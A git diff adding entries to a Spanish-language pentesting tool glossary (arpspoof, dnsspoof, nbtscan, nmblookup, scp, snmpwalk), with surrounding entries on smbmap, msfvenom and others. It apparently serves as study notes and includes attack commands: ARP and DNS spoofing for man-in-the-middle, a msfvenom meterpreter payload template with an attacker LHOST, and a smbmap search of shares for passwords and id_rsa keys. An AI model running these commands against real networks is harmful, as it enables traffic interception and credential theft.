@@ -1,5 +1,13 @@
 # Herramientas
 
+### `arpspoof`  
+Herramienta para **envenenamiento ARP (ARP spoofing/poisoning)** en redes LAN (parte de dsniff).  
+- Qué hace: envía respuestas ARP falsas para asociar la IP de la víctima o puerta de enlace a la MAC del atacante, permitiendo MiTM sobre tráfico local.  
+- Uso típico en pruebas: redirigir tráfico hacia el equipo de auditoría para análisis (captura con `tcpdump`/`wireshark`) o para pruebas de detección de redes.  
+- Opciones comunes: `-i <iface>` para interfaz, `-t <target>` para especificar objetivo, `-r` para inyectar en ambos sentidos (victima<>gateway).  
+- Riesgos y ética: altamente intrusivo — usar **solo** en entornos autorizados; puede interrumpir comunicación y ser detectado por sistemas de defensa.  
+- Ejemplos: `arpspoof -i eth0 -t <IP_TARGET> <IP_GATEWAY>`, `arpspoof -i wlan0 -t 192.168.1.5 -r 192.168.1.1`
+
 ### `cadaver`  
 Cliente WebDAV de línea de comandos, similar a un cliente FTP para servidores WebDAV.  
 - Permite **navegar, listar, subir, descargar, mover y borrar** archivos y directorios en un endpoint WebDAV.  
@@ -74,6 +82,14 @@ Herramienta avanzada de **reconocimiento DNS** en Python.
 - Permite **fuerza bruta de subdominios** con diccionarios.  
 - Realiza consultas inversas para identificar hosts por IP.  
 - Exporta resultados en múltiples formatos (CSV, JSON, XML).  
+
+### `dnsspoof`  
+Herramienta para **suplantación/poisoning de respuestas DNS** en una red local (paquete dsniff).  
+- Qué hace: intercepta consultas DNS en la LAN y responde con IPs falsas según un fichero de hosts para redirigir tráfico.  
+- Uso en laboratorio: simular ataques de MiTM, pruebas de detección IDS/EDR o enseñar riesgos de DNS inseguro.  
+- Requisitos: estar en la misma red/broadcast domain y, normalmente, ARP-spoofing activo para capturar tráfico objetivo; puede especificarse interfaz con `-i`.  
+- Ética/seguridad: solo en entornos controlados y autorizados; su uso en redes ajenas es ilegal.  
+- Ejemplos: `dnsspoof -i eth0 -f hosts.txt`, `echo "target.com <IP>" > hosts.txt && dnsspoof -i wlan0 -f hosts.txt`
 
 ### `enum4linux`  
 Herramienta en Perl para **enumeración y recolección de información de SMB/Windows** desde Linux.  
@@ -169,6 +185,14 @@ Herramienta de Metasploit para **generar payloads** en múltiples formatos (PE, 
 - Ética y seguridad: **solo** usar en VMs/labs autorizados; compartir artifacts o utilizarlos fuera de ese scope puede ser ilegal.
 - Ejemplos: `msfvenom -p <meterpreter> LHOST=<ip_atacante> LPORT=<puerto> -f <extensión> > <nombre_archivo>`
 
+### `nbtscan`  
+Herramienta para **escanear redes buscando nombres NetBIOS (hosts Windows/SMB)**.  
+- Qué hace: envía consultas NetBIOS sobre una red para enumerar equipos, nombres y direcciones IP.  
+- Uso típico: descubrimiento rápido de hosts Windows y equipos que exponen NetBIOS/SMB en redes locales.  
+- Limitaciones: depende de que NetBIOS esté habilitado; ineficaz a través de routers/NAT sin soporte NetBIOS; puede producir falsos positivos por hosts con múltiples nombres.  
+- Salida fácil de parsear para scripts; suele usarse en auditorías internas y reconocimiento inicial.  
+- Ejemplos: `nbtscan -r <IP_MASK>/24`, `nbtscan -v <IP_MASK>/24`
+
 ### `netcraft.com`  
 Servicio en línea de **reconocimiento de infraestructura web**.  
 - Identifica el **sistema operativo** del servidor.  
@@ -194,6 +218,22 @@ Herramienta avanzada de **escaneo de red y seguridad**.
 - Soporta múltiples tipos de escaneo: TCP SYN, UDP, ICMP, entre otros.  
 - La opción `-Pn` **omite el ping inicial** y fuerza el escaneo de puertos incluso si el host no responde a ICMP (útil en Windows o redes que bloquean ping).  
 
+### `nmblookup`  
+Cliente para **consultas NetBIOS name service** (parte de Samba).  
+- Qué hace: resuelve nombres NetBIOS a direcciones IP y consulta registros NBNS/WINS específicos.  
+- Útil para verificar resolución NetBIOS, consultar nombres específicos (`-A` para dirección invertida) y probar servidores WINS.  
+- Soporta interrogaciones puntuales (`name`, `GROUP`) y puede usarse para hacer consultas a NBNS en un host concreto con `-U`/`-R` según versión.  
+- Limitaciones: requiere que NetBIOS/NBNS esté disponible en la red; menos útil en redes modernas que usan solo DNS.  
+- Ejemplos: `nmblookup -A <IP>`, `nmblookup 'WORKGROUP<1>' <IP>`
+
+### `scp`  
+`scp` (secure copy) para **copiar archivos/dir de forma segura sobre SSH**.  
+- Qué hace: transfiere ficheros entre máquina local y remota (o entre dos remotas) usando el canal cifrado de SSH.  
+- Uso típico: subir backups, descargar logs, transferir binarios de forma segura entre servidores y estaciones de trabajo.  
+- Opciones útiles: `-r` (recursivo para directorios), `-P` (puerto SSH), `-C` (comprimir durante transferencia), `-p` (preservar permisos/timestamp), `-v` (verbose).  
+- Limitaciones: rendimiento comparado con `rsync` para sincronizaciones; negocia autenticación SSH (clave/contraseña) y depende de SSH activo en el destino.  
+- Ejemplos: `scp -P 2222 -C archivo.zip usuario@<IP>:/home/usuario/, scp -r proyecto/ user@host:/var/www/`
+
 ### `smbmap`  
 Herramienta para **enumeración y acceso a recursos SMB/Windows** desde Linux, pensada para realizar auditorías de permisos en shares de red.  
 - Lista **shares** disponibles en un host o dominio, muestra **permisos (lectura/escritura)** por share y permite interactuar con archivos (lectura, búsqueda y —en muchas instalaciones— descarga/subida).  
@@ -201,6 +241,14 @@ Herramienta para **enumeración y acceso a recursos SMB/Windows** desde Linux, p
 - Soporta usuario/contraseña, dominio y autenticación nula (null session). Se suele pasar `-H <host>` o `--target <host>`, `-u <user>`, `-p <pass>` y opcionalmente `-d <domain>`.  
 - Funcionalidades importantes: enumerar shares, mostrar permisos, listar contenido de un share, buscar archivos por patrón/regex dentro de los shares para localizar secretos (contraseñas, backups, keys), etc.
 - Ejemplos: `smbmap -H <IP> -u <user> -p <password>`, `smbmap -H <IP> -u '' -p ''`, `smbmap -H <IP> -u <user> -p <password> -r 'password|backup|id_rsa'` (busca archivos cuyo nombre coincida con el patrón dentro de los shares accesibles)
+
+### `snmpwalk`  
+Herramienta que realiza una **recorrida (walk) por la MIB via SNMP** para listar valores de OIDs.  
+- Qué hace: consulta recursivamente OIDs partiendo de una raíz especificada y muestra valores legibles (interfaces, tablas, contadores).  
+- Uso legítimo: monitorización, inventario de hardware, ver estados de interfaces, tablas ARP, información de uptime y versión de SNMP en equipos gestionados.  
+- Soporta versiones SNMP v1/v2c/v3 (seguridad avanzada en v3: usuario/clave/privacidad).  
+- Riesgos: si SNMP community strings son débiles (`public`/`private`) puede filtrar información sensible; atención en redes ajenas.  
+- Ejemplos: `snmpwalk -v2c -c public <IP>`, `snmpwalk -v3 -u user -A authpass -X privpass <IP>`
 
 ### `sublist3r`  
 Herramienta en Python para **enumerar subdominios**.  
